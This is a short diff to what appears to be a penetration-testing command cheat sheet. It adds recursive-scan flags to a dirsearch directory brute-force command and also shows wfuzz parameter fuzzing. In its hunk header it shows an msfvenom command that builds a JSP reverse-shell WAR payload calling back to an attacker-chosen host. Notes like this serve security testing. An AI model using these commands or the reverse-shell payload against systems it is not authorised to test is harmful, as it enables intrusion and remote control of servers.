@@ -7,8 +7,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
 # wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide responsecode <code>
 wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
 
-# dirsearch with standard wordlist; -b scan domain not ip; -E all extensions; -F follow redirects
-dirsearch -u '<target-url>' -b -E -F --plain-text-report <out-file>
+# dirsearch with standard wordlist; -b scan domain not ip; -E all extensions; -F follow redirects; -r recourse; -R <l> search recourseive with level <l>
+dirsearch -u '<target-url>' -b -E -F -r -R <l> --plain-text-report <out-file>
 
 # dirsearch with input list and 4 thrads
 dirsearch -L <in-list> -t 4
